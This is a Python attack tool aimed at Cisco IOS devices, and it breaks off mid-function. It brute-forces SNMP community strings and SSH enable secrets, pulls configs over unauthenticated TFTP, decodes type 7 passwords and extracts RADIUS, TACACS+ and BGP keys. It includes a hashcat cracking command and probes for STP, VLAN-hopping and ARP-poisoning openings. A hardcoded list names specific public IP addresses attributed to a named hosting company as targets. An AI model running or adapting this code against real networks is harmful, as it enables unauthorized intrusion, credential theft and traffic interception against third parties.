#!/usr/bin/env python3
"""
Cisco IOS / IOS-XE Enumerator

Sources: Cisco IOS in a Nutshell (156592942X), CyberOps, DevNet.

Targets: HTTP/REST API, SNMP (CDP neighbor table, running-config OID),
         Telnet banner, TFTP config pull, AAA (TACACS+/RADIUS) detection.

MacStadium context: IOS devices behind ASA (207.254.35.12) and
alongside Nexus (207.254.14.1).
"""

import json
import socket
import ssl
import struct
import urllib.request
import urllib.error
import base64
from typing import Optional

# ---------------------------------------------------------------------------
# IOS privilege-level notes (from Nutshell ch1/ch13):
#   0   = view only (limited show)
#   1   = user exec (Router>)
#  2-14 = custom privilege levels via `privilege exec level N cmd`
#  15   = privileged exec (Router#) — full config access
#
# enable password  → type 7 (XOR, trivially reversible)
# enable secret    → type 5 (MD5-crypt) or type 8/9 (PBKDF2/scrypt)
# service password-encryption → encrypts VTY/line passwords to type 7
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# Type 7 decoder (Cisco XOR password, from Nutshell ch13)
# ---------------------------------------------------------------------------
_XLAT = (
    0x64, 0x73, 0x66, 0x64, 0x3b, 0x6b, 0x66, 0x6f,
    0x41, 0x2c, 0x2e, 0x69, 0x79, 0x65, 0x77, 0x72,
    0x6b, 0x6c, 0x64, 0x4a, 0x4b, 0x44, 0x48, 0x53,
    0x55, 0x42, 0x73, 0x67, 0x76, 0x63, 0x61, 0x36,
    0x39, 0x38, 0x33, 0x34, 0x6e, 0x63, 0x78, 0x76,
    0x39, 0x38, 0x37, 0x33, 0x32, 0x35, 0x34, 0x6b,
    0x3b, 0x66, 0x67, 0x38, 0x37,
)

def decode_type7(enc: str) -> str:
    """Decode Cisco IOS type 7 (XOR) password — always recoverable."""
    try:
        seed = int(enc[:2])
        ciphertext = bytes.fromhex(enc[2:])
        plaintext = ''.join(
            chr(b ^ _XLAT[(seed + i) % len(_XLAT)])
            for i, b in enumerate(ciphertext)
        )
        return plaintext
    except Exception:
        return ''


# ---------------------------------------------------------------------------
# BER SNMP helpers (pure stdlib — RFC 1157 / 3416)
# ---------------------------------------------------------------------------

def _ber_oid(oid_str: str) -> bytes:
    parts = [int(x) for x in oid_str.strip('.').split('.')]
    encoded = bytes([40 * parts[0] + parts[1]])
    for n in parts[2:]:
        if n == 0:
            encoded += b'\x00'
            continue
        tmp = []
        while n:
            tmp.append(n & 0x7f)
            n >>= 7
        tmp.reverse()
        for i, b in enumerate(tmp):
            encoded += bytes([b | (0x80 if i < len(tmp) - 1 else 0)])
    return bytes([0x06, len(encoded)]) + encoded


def _ber_int(value: int) -> bytes:
    n = value
    b = []
    while True:
        b.insert(0, n & 0xff)
        n >>= 8
        if n == 0:
            break
    if b[0] & 0x80:
        b.insert(0, 0)
    return bytes([0x02, len(b)] + b)


def _ber_str(s: bytes) -> bytes:
    return bytes([0x04, len(s)]) + s


def _ber_seq(*parts) -> bytes:
    body = b''.join(parts)
    return bytes([0x30, len(body)]) + body


def _snmp_get_request(community: str, oid: str, request_id: int = 1) -> bytes:
    comm = community.encode()
    pdu_body = (
        _ber_int(request_id) +   # request-id
        _ber_int(0) +            # error-status
        _ber_int(0) +            # error-index
        _ber_seq(                # variable-bindings
            _ber_seq(_ber_oid(oid) + bytes([0x05, 0x00]))  # OID + NULL
        )
    )
    pdu = bytes([0xa0, len(pdu_body)]) + pdu_body  # GetRequest-PDU tag
    msg = _ber_seq(
        _ber_int(0),          # version: v1
        _ber_str(comm),       # community
        pdu,
    )
    return msg


def _parse_snmp_response(data: bytes) -> Optional[str]:
    """Naive string extraction from SNMP response — finds OctetString values."""
    results = []
    i = 0
    while i < len(data):
        if data[i] == 0x04:  # OctetString
            length = data[i + 1]
            value = data[i + 2:i + 2 + length]
            try:
                results.append(value.decode('utf-8', errors='replace'))
            except Exception:
                pass
            i += 2 + length
        else:
            i += 1
    return results


def snmp_get(host: str, community: str, oid: str,
             port: int = 161, timeout: float = 3.0) -> dict:
    pkt = _snmp_get_request(community, oid)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(pkt, (host, port))
        data, _ = sock.recvfrom(4096)
        sock.close()
        values = _parse_snmp_response(data)
        return {'responsive': True, 'values': values, 'raw': data.hex()[:200]}
    except Exception as e:
        return {'responsive': False, 'error': str(e)}


# ---------------------------------------------------------------------------
# TFTP config pull (UDP port 69) — no auth, some routers allow by default
# ---------------------------------------------------------------------------

def probe_tftp_config(host: str, filename: str = 'running-config',
                      timeout: float = 3.0) -> dict:
    """
    Send TFTP RRQ for running-config. Some IOS devices allow unauthenticated
    TFTP backup reads — documented in Nutshell ch2 as the primary IOS upgrade
    mechanism. A misconfigured `tftp-server` or no `access-class` means free read.
    """
    # TFTP RRQ: opcode=1, filename, 0, mode='netascii', 0
    payload = struct.pack('!H', 1) + filename.encode() + b'\x00netascii\x00'
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(payload, (host, 69))
        data, addr = sock.recvfrom(65535)
        sock.close()
        opcode = struct.unpack('!H', data[:2])[0]
        if opcode == 3:  # DATA
            return {
                'accessible': True,
                'content': data[4:].decode('utf-8', errors='replace'),
                'bytes': len(data[4:]),
            }
        if opcode == 5:  # ERROR
            return {'accessible': False, 'error_code': data[2], 'msg': data[4:].decode(errors='replace')}
        return {'accessible': False, 'opcode': opcode}
    except Exception as e:
        return {'accessible': False, 'error': str(e)}


# ---------------------------------------------------------------------------
# Telnet banner grab
# ---------------------------------------------------------------------------

def probe_telnet(host: str, port: int = 23, timeout: float = 4.0) -> dict:
    """
    Connect to Telnet port, grab banner. IOS version string appears in the
    initial banner text (Nutshell ch1). Also reveals whether login password
    is set or not.
    """
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        data = sock.recv(1024)
        sock.close()
        banner = data.decode('utf-8', errors='replace').strip()
        ios_version = ''
        for line in banner.splitlines():
            if 'IOS' in line or 'Cisco' in line or 'Version' in line:
                ios_version = line.strip()
                break
        return {
            'open': True,
            'banner': banner[:500],
            'ios_version': ios_version,
        }
    except ConnectionRefusedError:
        return {'open': False, 'error': 'refused'}
    except Exception as e:
        return {'open': False, 'error': str(e)}


# ---------------------------------------------------------------------------
# IOS-XE REST API (RESTCONF / native REST)
# ---------------------------------------------------------------------------

def probe_http_api(host: str, port: int = 443, username: str = '',
                   password: str = '', timeout: float = 6.0) -> dict:
    """
    Probe IOS-XE REST API endpoints. IOS-XE 16.3+ supports RESTCONF on 443.
    DevNet book: /restconf/data/ietf-interfaces:interfaces returns interface list.
    Older IOS-XE: /api/v1/ (Cisco Prime / APIC-EM gateway pattern).
    Also check /rest/data/ (IOS-XE native REST older path).
    """
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE

    auth = ''
    if username:
        auth = 'Basic ' + base64.b64encode(f'{username}:{password}'.encode()).decode()

    paths = [
        '/restconf/data/ietf-interfaces:interfaces',
        '/restconf/data/native',
        '/restconf/data/ietf-routing:routing',
        '/api/v1/global-credential',
        '/api/v1/network-device',
        '/rest/data/ietf-interfaces:interfaces',
    ]

    results = {}
    for path in paths:
        url = f'https://{host}:{port}{path}'
        req = urllib.request.Request(url)
        req.add_header('Accept', 'application/yang-data+json, application/json')
        req.add_header('Content-Type', 'application/yang-data+json')
        if auth:
            req.add_header('Authorization', auth)
        try:
            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                body = r.read().decode('utf-8', errors='replace')
                results[path] = {'status': r.status, 'body': body[:500]}
        except urllib.error.HTTPError as e:
            results[path] = {'status': e.code}
        except Exception as e:
            results[path] = {'error': str(e)[:80]}

    return results


# ---------------------------------------------------------------------------
# SNMP probes — sysDescr, sysName, CDP neighbor table, running-config OID
# ---------------------------------------------------------------------------

# Key OIDs
OID_SYSDESCR    = '1.3.6.1.2.1.1.1.0'
OID_SYSNAME     = '1.3.6.1.2.1.1.5.0'
OID_SYSUPTIME   = '1.3.6.1.2.1.1.3.0'
OID_IOS_VERSION = '1.3.6.1.4.1.9.9.25.1.1.1.2.5'   # Cisco entPhysicalSoftwareRev
OID_RUNNING_CFG = '1.3.6.1.4.1.9.2.1.54'             # Cisco private: bulk config pull (partial)
OID_CDP_CACHE   = '1.3.6.1.4.1.9.9.23.1.2.1'         # cdpCacheTable root
OID_CDP_DEVID   = '1.3.6.1.4.1.9.9.23.1.2.1.1.6'    # cdpCacheDeviceId
OID_CDP_ADDR    = '1.3.6.1.4.1.9.9.23.1.2.1.1.4'    # cdpCacheAddress
OID_CDP_PLAT    = '1.3.6.1.4.1.9.9.23.1.2.1.1.8'    # cdpCachePlatform
OID_CDP_CAP     = '1.3.6.1.4.1.9.9.23.1.2.1.1.9'    # cdpCacheCapabilities

COMMON_SNMP_COMMUNITIES = [
    'public', 'private', 'cisco', 'RO', 'RW',
    'community', 'secret', 'router', 'network',
    'not-public', 'not-secure',  # common "security through obscurity" names from Nutshell
]


def probe_snmp(host: str, community: str = 'public', port: int = 161,
               timeout: float = 3.0) -> dict:
    result = {'community': community, 'responsive': False}

    r = snmp_get(host, community, OID_SYSDESCR, port, timeout)
    if not r['responsive']:
        return result

    result['responsive']   = True
    result['sysdescr']     = r['values'][0] if r['values'] else ''
    result['sysname']      = (snmp_get(host, community, OID_SYSNAME, port, timeout)
                               .get('values', [''])[0])

    # Try running-config OID (Cisco private — often returns nothing but worth trying)
    cfg_r = snmp_get(host, community, OID_RUNNING_CFG, port, timeout)
    result['running_config_fragment'] = cfg_r.get('values', [])

    return result


def probe_cdp_info(host: str, community: str = 'public', port: int = 161,
                   timeout: float = 3.0) -> dict:
    """
    Pull CDP neighbor table via SNMP. CDP is enabled by default on all IOS
    interfaces (Nutshell ch26). Reveals: neighbor hostnames, IPs, platform,
    capabilities — full L2/L3 topology without auth beyond SNMP read community.
    """
    result = {'neighbors': []}
    for oid, label in [
        (OID_CDP_DEVID, 'device_id'),
        (OID_CDP_PLAT,  'platform'),
    ]:
        r = snmp_get(host, community, oid, port, timeout)
        if r.get('responsive') and r.get('values'):
            result['neighbors'].append({label: r['values'][0]})
    return result


def brute_snmp_communities(host: str, communities: list = None,
                            port: int = 161) -> dict:
    """Try community strings until one responds."""
    communities = communities or COMMON_SNMP_COMMUNITIES
    for comm in communities:
        r = snmp_get(host, comm, OID_SYSDESCR, port, timeout=2.0)
        if r.get('responsive') and r.get('values'):
            return {'found': True, 'community': comm,
                    'sysdescr': r['values'][0]}
    return {'found': False}


# ---------------------------------------------------------------------------
# SSH enable-secret brute (requires paramiko)
# ---------------------------------------------------------------------------

COMMON_ENABLE_SECRETS = [
    'cisco', 'enable', 'cisco123', '', 'Cisco123',
    'C1sco12345', 'secret', 'password', 'admin',
]


def brute_enable_secret(host: str, ssh_user: str, ssh_pass: str,
                        enable_words: list = None, port: int = 22,
                        timeout: float = 8.0) -> dict:
    """
    SSH in, send 'enable', try common secrets. Type 5 (MD5) hashes crackable
    with hashcat -m 500; type 7 is XOR-reversible (decode_type7).
    """
    enable_words = enable_words or COMMON_ENABLE_SECRETS
    result = {'ssh_ok': False, 'enable_ok': False, 'secret': None}
    try:
        import paramiko
    except ImportError:
        result['error'] = 'paramiko not available'
        return result

    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, port=port, username=ssh_user, password=ssh_pass,
                       timeout=timeout, look_for_keys=False, allow_agent=False)
        result['ssh_ok'] = True

        shell = client.invoke_shell()
        shell.settimeout(5.0)
        import time; time.sleep(0.5)
        shell.recv(4096)  # flush banner

        shell.send('enable\n')
        time.sleep(0.3)
        prompt = shell.recv(1024).decode(errors='replace')

        if 'Password' in prompt or 'password' in prompt:
            for secret in enable_words:
                shell.send(secret + '\n')
                time.sleep(0.4)
                out = shell.recv(1024).decode(errors='replace')
                if out.strip().endswith('#'):
                    result['enable_ok'] = True
                    result['secret'] = secret
                    break

        client.close()
    except Exception as e:
        result['error'] = str(e)[:100]

    return result


# ---------------------------------------------------------------------------
# Config parser — extracts credentials from running-config dump
# ---------------------------------------------------------------------------

_TYPE7_RE   = r'password 7 ([0-9A-Fa-f]{4,})'
_TYPE5_RE   = r'(?:secret|password) 5 (\$1\$[^\s]+)'
_TYPE8_RE   = r'(?:secret|password) 8 (\$8\$[^\s]+)'
_TYPE9_RE   = r'(?:secret|password) 9 (\$9\$[^\s]+)'
_RADIUS_KEY = r'radius-server key ([^\n]+)'
_TACACS_KEY = r'tacacs-server key ([^\n]+)'
_NTP_KEY    = r'ntp authentication-key \d+ md5 ([^\n]+)'
_BGP_PASS   = r'neighbor [0-9.]+ password ([^\n]+)'
_OSPF_AUTH  = r'area \S+ authentication message-digest'
_SNMP_COMM  = r'snmp-server community (\S+)'
_CDP_EN     = r'^(?:no )?cdp run'
_VTY_PASS   = r'line vty.*?password (?:7 )?(\S+)'

import re as _re

def parse_ios_config(config_text: str) -> dict:
    """
    Extract credentials and security-relevant config from IOS running-config.
    Decodes type 7 passwords in place.
    """
    result = {
        'type7_passwords': [],
        'type5_hashes':    [],
        'type8_hashes':    [],
        'type9_hashes':    [],
        'radius_keys':     [],
        'tacacs_keys':     [],
        'ntp_keys':        [],
        'bgp_passwords':   [],
        'snmp_communities':[],
        'cdp_enabled':     None,
        'ospf_md5_auth':   bool(_re.search(_OSPF_AUTH, config_text)),
    }

    for m in _re.finditer(_TYPE7_RE, config_text):
        enc = m.group(1)
        result['type7_passwords'].append({'enc': enc, 'clear': decode_type7(enc)})

    for pattern, key in [
        (_TYPE5_RE,   'type5_hashes'),
        (_TYPE8_RE,   'type8_hashes'),
        (_TYPE9_RE,   'type9_hashes'),
        (_RADIUS_KEY, 'radius_keys'),
        (_TACACS_KEY, 'tacacs_keys'),
        (_NTP_KEY,    'ntp_keys'),
        (_BGP_PASS,   'bgp_passwords'),
        (_SNMP_COMM,  'snmp_communities'),
    ]:
        for m in _re.finditer(pattern, config_text, _re.MULTILINE):
            result[key].append(m.group(1).strip())

    cdp_match = _re.search(_CDP_EN, config_text, _re.MULTILINE)
    if cdp_match:
        result['cdp_enabled'] = not cdp_match.group().startswith('no')

    return result


# ---------------------------------------------------------------------------
# MacStadium IOS candidates
# ---------------------------------------------------------------------------
MACSTADIUM_IOS_CANDIDATES = [
    {'host': '207.254.14.1',  'label': 'nexus_gw',     'port': 443},
    {'host': '207.254.14.2',  'label': 'ios_gw_2',     'port': 443},
    {'host': '10.0.1.1',      'label': 'internal_gw',  'port': 443},
    {'host': '172.16.1.1',    'label': 'mgmt_gw',      'port': 443},
]


# ---------------------------------------------------------------------------
# Main enumerator
# ---------------------------------------------------------------------------
class IOSEnumerator:
    def __init__(self, host: str, port: int = 443,
                 username: str = 'admin', password: str = '',
                 timeout: float = 6.0):
        self.host     = host
        self.port     = port
        self.username = username
        self.password = password
        self.timeout  = timeout
        self.findings = []

    def run(self) -> dict:
        result = {
            'host':           self.host,
            'telnet':         {},
            'snmp':           {},
            'cdp_neighbors':  {},
            'tftp_config':    {},
            'http_api':       {},
            'parsed_config':  {},
            'findings':       [],
        }

        # Telnet banner — IOS version without any auth
        result['telnet'] = probe_telnet(self.host, timeout=self.timeout)
        if result['telnet'].get('open') and result['telnet'].get('ios_version'):
            self.findings.append({
                'severity': 'MEDIUM',
                'title':    'IOS Telnet Open — Version Exposed',
                'detail':   result['telnet']['ios_version'],
            })

        # SNMP brute
        snmp_result = brute_snmp_communities(self.host)
        result['snmp'] = snmp_result
        if snmp_result.get('found'):
            self.findings.append({
                'severity': 'HIGH',
                'title':    f"IOS SNMP Weak Community: {snmp_result['community']}",
                'detail':   snmp_result.get('sysdescr', '')[:200],
            })
            # Try CDP neighbor dump with found community
            result['cdp_neighbors'] = probe_cdp_info(
                self.host, snmp_result['community'])
            if result['cdp_neighbors'].get('neighbors'):
                self.findings.append({
                    'severity': 'MEDIUM',
                    'title':    'IOS CDP Neighbor Table via SNMP',
                    'detail':   str(result['cdp_neighbors']['neighbors'])[:300],
                })

            # Try running-config via SNMP private OID
            cfg_r = probe_snmp(self.host, snmp_result['community'])
            if cfg_r.get('running_config_fragment'):
                parsed = parse_ios_config('\n'.join(cfg_r['running_config_fragment']))
                result['parsed_config'] = parsed
                self._flag_config_findings(parsed)

        # TFTP running-config
        result['tftp_config'] = probe_tftp_config(self.host, timeout=self.timeout)
        if result['tftp_config'].get('accessible'):
            self.findings.append({
                'severity': 'CRITICAL',
                'title':    'IOS TFTP running-config Accessible (unauthenticated)',
                'detail':   result['tftp_config'].get('content', '')[:400],
            })
            parsed = parse_ios_config(result['tftp_config'].get('content', ''))
            result['parsed_config'] = parsed
            self._flag_config_findings(parsed)

        # IOS-XE REST API
        result['http_api'] = probe_http_api(
            self.host, self.port, self.username, self.password, self.timeout)
        for path, r in result['http_api'].items():
            if isinstance(r, dict) and r.get('status') == 200:
                self.findings.append({
                    'severity': 'HIGH',
                    'title':    f'IOS-XE RESTCONF Accessible: {path}',
                    'detail':   r.get('body', '')[:200],
                })

        result['findings'] = self.findings
        return result

    def _flag_config_findings(self, parsed: dict) -> None:
        for entry in parsed.get('type7_passwords', []):
            self.findings.append({
                'severity': 'HIGH',
                'title':    'IOS Type 7 Password (XOR — trivially reversible)',
                'detail':   f"enc={entry['enc']} → clear={entry['clear']}",
            })
        for h in parsed.get('type5_hashes', []):
            self.findings.append({
                'severity': 'MEDIUM',
                'title':    'IOS Type 5 Enable Secret (MD5-crypt)',
                'detail':   f"{h} — crack: hashcat -m 500 '{h}' rockyou.txt",
            })
        for comm in parsed.get('snmp_communities', []):
            if comm in COMMON_SNMP_COMMUNITIES:
                self.findings.append({
                    'severity': 'HIGH',
                    'title':    f'IOS Default SNMP Community in Config: {comm}',
                    'detail':   'Default community string — unauthenticated OID walk',
                })
        for key in parsed.get('radius_keys', []):
            self.findings.append({
                'severity': 'CRITICAL',
                'title':    'IOS RADIUS Shared Key Exposed',
                'detail':   key,
            })
        for key in parsed.get('tacacs_keys', []):
            self.findings.append({
                'severity': 'CRITICAL',
                'title':    'IOS TACACS+ Key Exposed',
                'detail':   key,
            })


# ---------------------------------------------------------------------------
# Layer 2 attack surface probes (Chapter 7: Fraudulent Network Devices)
# CDP/LLDP topology exposure, STP manipulation, VLAN hopping, ARP bypass
# ---------------------------------------------------------------------------

def _snmp_get_raw(host: str, community: str, oid: str,
                  port: int = 161, timeout: float = 3.0) -> Optional[bytes]:
    """Return raw SNMP UDP response bytes or None on failure."""
    pkt = _snmp_get_request(community, oid)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(pkt, (host, port))
        data, _ = sock.recvfrom(4096)
        sock.close()
        return data
    except Exception:
        return None


def _snmp_int_from_response(data: bytes) -> Optional[int]:
    """
    Extract the INTEGER value from an SNMP GetResponse varbind.
    Scans for OID tag (0x06) followed immediately by INTEGER (0x02),
    the varbind [OID, value] structure in SNMP responses.
    """
    i = 0
    while i < len(data) - 4:
        if data[i] == 0x06:  # OID tag
            oid_len = data[i + 1]
            nxt = i + 2 + oid_len
            if nxt + 1 < len(data) and data[nxt] == 0x02:  # INTEGER follows OID
                int_len = data[nxt + 1]
                if nxt + 2 + int_len <= len(data):
                    return int.from_bytes(
                        data[nxt + 2:nxt + 2 + int_len], 'big', signed=False)
        i += 1
    return None


def probe_cdp_lldp_exposure(host: str, community: str = 'public',
                             timeout: float = 5.0) -> dict:
    """
    CDP/LLDP neighbor information exposure via SNMP.
    Chapter 7: fraudulent L2 bridges use CDP/LLDP neighbor tables to map
    topology without any auth beyond the SNMP community string. cdpCacheDeviceId
    and lldpRemSysName reveal neighbor hostnames; cdpCacheAddress leaks IPs.
    CDP is on by default on all IOS interfaces (Nutshell ch26).
    """
    findings = []
    port = 161
    detail: dict = {}

    # CDP neighbor device IDs (hostnames) — OID 1.3.6.1.4.1.9.9.23.1.2.1.1.6
    raw = _snmp_get_raw(host, community, OID_CDP_DEVID, port, timeout)
    if raw is not None:
        vals = _parse_snmp_response(raw)
        val = vals[0].strip() if vals else ''
        if val:
            detail['cdp_neighbor_hostname'] = val
            findings.append({
                'severity': 'HIGH',
                'title':    'CDP_NEIGHBORS_EXPOSED — device topology leaked',
                'detail':   f'cdpCacheDeviceId={val!r}',
                'host':     host,
                'port':     port,
            })

    # LLDP neighbor system name — OID 1.0.8802.1.1.2.1.4.1.1.9
    raw = _snmp_get_raw(host, community, '1.0.8802.1.1.2.1.4.1.1.9', port, timeout)
    if raw is not None:
        vals = _parse_snmp_response(raw)
        val = vals[0].strip() if vals else ''
        if val:
            detail['lldp_neighbor'] = val
            findings.append({
                'severity': 'HIGH',
                'title':    'LLDP_NEIGHBORS_EXPOSED',
                'detail':   f'lldpRemSysName={val!r}',
                'host':     host,
                'port':     port,
            })

    # CDP platform type — OID 1.3.6.1.4.1.9.9.23.1.2.1.1.8
    raw = _snmp_get_raw(host, community, OID_CDP_PLAT, port, timeout)
    if raw is not None:
        vals = _parse_snmp_response(raw)
        val = vals[0].strip() if vals else ''
        if val:
            detail['cdp_platform'] = val
            findings.append({
                'severity': 'MEDIUM',
                'title':    'CDP_PLATFORM_DISCLOSED',
                'detail':   f'cdpCachePlatform={val!r}',
                'host':     host,
                'port':     port,
            })

    # CDP neighbor IPs — OID 1.3.6.1.4.1.9.9.23.1.2.1.1.4
    # Value is a binary OCTET STRING (4-byte IPv4 address)
    raw = _snmp_get_raw(host, community, OID_CDP_ADDR, port, timeout)
    if raw is not None:
        vals = _parse_snmp_response(raw)
        val = vals[0] if vals else ''
        if val:
            detail['cdp_neighbor_ip_raw'] = val
            findings.append({
                'severity': 'HIGH',
                'title':    'CDP_NEIGHBOR_IPS_EXPOSED',
                'detail':   f'cdpCacheAddress={val!r}',
                'host':     host,
                'port':     port,
            })

    return {'findings': findings, 'detail': detail}


def probe_stp_manipulation_surface(host: str, community: str = 'public',
                                   timeout: float = 5.0) -> dict:
    """
    Spanning Tree Protocol attack surface via SNMP.
    Chapter 7: STP root election attack — inject BPDUs with priority 0 to
    displace the legitimate root bridge and redirect all L2 traffic through
    the fraudulent device for passive interception or active manipulation.
    Non-root bridges (priority > 4096) are candidates; recent topology
    changes (< 60s) indicate active reconvergence windows ripe for attack.
    """
    findings = []
    port = 161
    detail: dict = {}

    # Root port — OID 1.3.6.1.2.1.17.2.7
    raw = _snmp_get_raw(host, community, '1.3.6.1.2.1.17.2.7', port, timeout)
    if raw is not None:
        val = _snmp_int_from_response(raw)
        if val is not None:
            detail['stp_root_port'] = val
            findings.append({
                'severity': 'MEDIUM',
                'title':    'STP_ROOT_PORT_DISCLOSED — topology inference',
                'detail':   f'dot1dStpRootPort={val} (identifies upstream path to root bridge)',
                'host':     host,
                'port':     port,
            })

    # Bridge priority — OID 1.3.6.1.2.1.17.2.3
    # Default: 32768; root typically 4096. Value > 4096 = non-root = attack candidate.
    raw = _snmp_get_raw(host, community, '1.3.6.1.2.1.17.2.3', port, timeout)
    if raw is not None:
        val = _snmp_int_from_response(raw)
        if val is not None:
            detail['stp_priority'] = val
            if val > 4096:
                findings.append({
                    'severity': 'HIGH',
                    'title':    'STP_HIGH_PRIORITY — non-root bridge; root election attack possible',
                    'detail':   (f'dot1dStpPriority={val} (>4096; inject BPDU '
                                 f'priority 0 to claim root and redirect L2 traffic)'),
                    'host':     host,
                    'port':     port,
                })

    # Time since last topology change — OID 1.3.6.1.2.1.17.2.1 (TimeTicks: 1/100s)
    raw = _snmp_get_raw(host, community, '1.3.6.1.2.1.17.2.1', port, timeout)
    if raw is not None:
        val = _snmp_int_from_response(raw)
        if val is not None:
            seconds = val // 100
            detail['stp_time_since_topo_change_s'] = seconds
            if seconds < 60:
                findings.append({
                    'severity': 'HIGH',
                    'title':    'STP_RECENT_TOPOLOGY_CHANGE — active STP reconvergence',
                    'detail':   (f'dot1dStpTimeSinceTopologyChange={seconds}s '
                                 f'(<60s; bridge in flux — BPDU injection during reconvergence maximises impact)'),
                    'host':     host,
                    'port':     port,
                })

    # Bridge max age — OID 1.3.6.1.2.1.17.2.8 (centiseconds)
    raw = _snmp_get_raw(host, community, '1.3.6.1.2.1.17.2.8', port, timeout)
    if raw is not None:
        val = _snmp_int_from_response(raw)
        if val is not None:
            max_age_s = val // 100
            detail['stp_max_age_s'] = max_age_s
            if max_age_s > 30:
                findings.append({
                    'severity': 'MEDIUM',
                    'title':    'STP_LONG_MAX_AGE',
                    'detail':   (f'dot1dStpBridgeMaxAge={max_age_s}s '
                                 f'(>30s; stale topology info persists; BPDU injection window widens)'),
                    'host':     host,
                    'port':     port,
                })

    return {'findings': findings, 'detail': detail}


def probe_vlan_hopping_surface(host: str, community: str = 'public',
                                timeout: float = 5.0) -> dict:
    """
    VLAN hopping attack surface via SNMP.
    Chapter 7: DTP-enabled ports auto-negotiate trunking, allowing a fraudulent
    device to negotiate a trunk link and inject 802.1Q double-tagged frames.
    Native VLAN 1 amplifies impact — double-tagged frames with outer tag 1
    traverse trunks unstripped, landing in any target VLAN without L3 routing.
    """
    findings = []
    port = 161
    detail: dict = {}

    # DTP dynamic trunk status — OID 1.3.6.1.4.1.9.9.46.1.6.1.1.14
    # vlanTrunkPortDynamicStatus: 1 = trunking, 2 = notTrunking, 3 = notApplicable
    raw = _snmp_get_raw(host, community, '1.3.6.1.4.1.9.9.46.1.6.1.1.14', port, timeout)
    if raw is not None:
        val = _snmp_int_from_response(raw)
        if val is not None:
            detail['trunk_dynamic_status'] = val
            if val == 1:
                findings.append({
                    'severity': 'CRITICAL',
                    'title':    'VLAN_TRUNK_DYNAMIC — DTP active; double-tagging possible',
                    'detail':   (f'vlanTrunkPortDynamicStatus={val} (trunking; '
                                 f'inject 802.1Q double-tag to hop VLANs without L3 routing)'),
                    'host':     host,
                    'port':     port,
                })

    # Native VLAN 1 active — OID 1.3.6.1.2.1.17.7.1.4.3.1.1 (dot1qVlanStaticName)
    raw = _snmp_get_raw(host, community, '1.3.6.1.2.1.17.7.1.4.3.1.1', port, timeout)
    if raw is not None:
        vals = _parse_snmp_response(raw)
        val = vals[0].strip() if vals else ''
        if val:
            detail['vlan_static_name'] = val
            findings.append({
                'severity': 'MEDIUM',
                'title':    'VLAN1_ACTIVE — native VLAN 1 in use',
                'detail':   (f'dot1qVlanStaticName={val!r} '
                             f'(VLAN 1 active; change native VLAN to unused ID to prevent double-tag crossing)'),
                'host':     host,
                'port':     port,
            })

    # Untagged access VLAN — OID 1.3.6.1.4.1.9.9.68.1.2.2.1.2 (vmVlan)
    raw = _snmp_get_raw(host, community, '1.3.6.1.4.1.9.9.68.1.2.2.1.2', port, timeout)
    if raw is not None:
        val = _snmp_int_from_response(raw)
        if val is not None:
            detail['access_vlan'] = val
            findings.append({
                'severity': 'MEDIUM',
                'title':    'ACCESS_VLAN_DISCLOSED',
                'detail':   (f'vmVlan={val} '
                             f'(untagged VLAN on access port disclosed; aids VLAN targeting for double-tag attack)'),
                'host':     host,
                'port':     port,
            })

    return {'findings': findings, 'detail': detail}


def probe_arp_inspection_bypass(host: str, community: str = 'public',
                                 timeout: float = 5.0) -> dict:
    """
    ARP/DHCP attack surface via SNMP.
    Chapter 7: disabled DHCP snooping and all-dynamic ARP tables enable
    gratuitous ARP poisoning and Dynamic ARP Inspection bypass. A fraudulent
    L2 bridge can become the default gateway for any host on the segment by
    poisoning ARP caches, intercepting traffic without detection.
    """
    findings = []
    port = 161
    detail: dict = {}

    # ARP entry type — OID 1.3.6.1.2.1.4.22.1.4 (ipNetToMediaType)
    # 1=other, 2=invalid, 3=dynamic, 4=static
    raw = _snmp_get_raw(host, community, '1.3.6.1.2.1.4.22.1.4', port, timeout)
    if raw is not None:
        val = _snmp_int_from_response(raw)
        if val is not None:
            detail['arp_entry_type'] = val
            if val == 3:
                findings.append({
                    'severity': 'MEDIUM',
                    'title':    'ARP_DYNAMIC_ENTRIES — DAI bypass possible without static ARP',
                    'detail':   (f'ipNetToMediaType={val} (dynamic; '
                                 f'no static ARP binding; DAI ineffective without DHCP snooping binding table)'),
                    'host':     host,
                    'port':     port,
                })

    # DHCP snooping enabled — OID 1.3.6.1.4.1.9.9.380.1.1.1 (cDhcpv2SnoopingEnabled)
    # TruthValue: 1=true, 2=false (RFC SNMP convention) or 0=false (Cisco variant)
    raw = _snmp_get_raw(host, community, '1.3.6.1.4.1.9.9.380.1.1.1', port, timeout)
    if raw is not None:
        val = _snmp_int_from_response(raw)
        if val is not None:
            detail['dhcp_snooping_enabled'] = val
            if val == 0 or val == 2:
                findings.append({
                    'severity': 'HIGH',
                    'title':    'DHCP_SNOOPING_DISABLED',
                    'detail':   (f'cDhcpv2SnoopingEnabled={val} (disabled; '
                                 f'rogue DHCP server and ARP poisoning unmitigated; '
                                 f'DAI binding table absent)'),
                    'host':     host,
                    'port':     port,
                })

    # IP routing discards — OID 1.3.6.1.2.1.4.11 (ipRoutingDiscards)
    # Elevated count indicates ARP storm, routing loop, or active gratuitous ARP flood
    raw = _snmp_get_raw(host, community, '1.3.6.1.2.1.4.11', port, timeout)
    if raw is not None:
        val = _snmp_int_from_response(raw)
        if val is not None:
            detail['ip_routing_discards'] = val
            if val > 100:
                findings.append({
                    'severity': 'MEDIUM',
                    'title':    'HIGH_ROUTE_DISCARDS — possible ARP storm',
                    'detail':   (f'ipRoutingDiscards={val} '
                                 f'(>100; elevated discard rate consistent with ARP storm or routing loop)'),
                    'host':     host,
                    'port':     port,
                })

    return {'findings': findings, 'detail': detail}


# ---------------------------------------------------------------------------
# AAA bypass surface — TACACS+ / RADIUS / SNMP TACACS MIB
# ---------------------------------------------------------------------------

def probe_cisco_aaa_bypass(host: str, port: int = 49, timeout: float = 5.0) -> list:
    """
